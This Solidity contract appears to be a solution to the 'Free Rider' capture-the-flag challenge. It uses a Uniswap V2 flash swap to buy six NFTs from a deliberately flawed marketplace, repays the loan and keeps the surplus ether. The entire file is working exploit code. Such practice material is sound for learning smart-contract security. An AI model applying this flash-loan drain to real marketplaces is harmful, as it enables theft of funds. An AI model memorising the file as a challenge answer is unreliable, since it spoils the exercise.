// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IERC20.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '../../free-rider/FreeRiderNFTMarketplace.sol';
import '../../DamnValuableNFT.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IWETH immutable weth;
    IUniswapV2Router02 immutable router;
    IUniswapV2Factory immutable factory;
    IUniswapV2Pair immutable pair;
    FreeRiderNFTMarketplace immutable marketplace;
    DamnValuableNFT immutable nft;
    address immutable buyer;
    address payable immutable owner;

    uint constant public TOKENS_PRICE = 15 ether;

    using Address for address payable;

    constructor(
        IUniswapV2Router02 _router, 
        IUniswapV2Factory _factory, 
        IUniswapV2Pair _pair, 
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        address _buyer
    ) {
        require(address(_router) != address(0), 'Zero address is not allowed');
        require(address(_factory) != address(0), 'Zero address is not allowed');
        require(address(_marketplace) != address(0), 'Zero address is not allowed');

        router = _router;
        factory = _factory;
        pair = _pair;
        weth = IWETH(_router.WETH());
        marketplace = _marketplace;
        nft = _nft;
        buyer = _buyer;
        owner = payable(msg.sender);
    }

    function attack() external {
        require(msg.sender == owner, 'This attack is only for owner');
        
        pair.swap(TOKENS_PRICE, 0, address(this), bytes('Non empty string'));
    }

    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        
        require(msg.sender == address(pair), 'msg.sender must be a V2 pair');
        require(token0 == address(weth), 'token0 must be weth');
        require(amount0 == TOKENS_PRICE, 'Send exactly TOKENS_PRICE');
        require(amount1 == 0, 'amount1 must be 0');
        
        weth.withdraw(TOKENS_PRICE);
        require(address(this).balance >= TOKENS_PRICE, 'Balance is not TOKENS_PRICE');

        marketplace.buyMany{value: TOKENS_PRICE}(getArrayFromZeroTo(5));

        // return flash loan
        uint total = getTotalReturnAmount();
        weth.deposit{value: total}();
        weth.transfer(msg.sender, total);

        owner.sendValue(address(this).balance);
    }

    function getTotalReturnAmount() private pure returns (uint) {
        uint uniswapFeeNumerator = 3;
        uint uniswapFeeDenominator = 997;
        uint fee = TOKENS_PRICE * uniswapFeeNumerator / uniswapFeeDenominator;
        return TOKENS_PRICE + fee + 1;
    }

    function getArrayFromZeroTo(uint n) public pure returns(uint[] memory) {
        uint[] memory result = new uint[](n + 1);
        for (uint i = 0; i <= n; i++)
            result[i] = i;
        return result;
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) 
        external
        override
        pure
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    function sendAllNftsToBuyer() external {
        for (uint tokenId = 0; tokenId <= 5; tokenId++){
            nft.safeTransferFrom(address(this), buyer, tokenId);
        }
    }

}
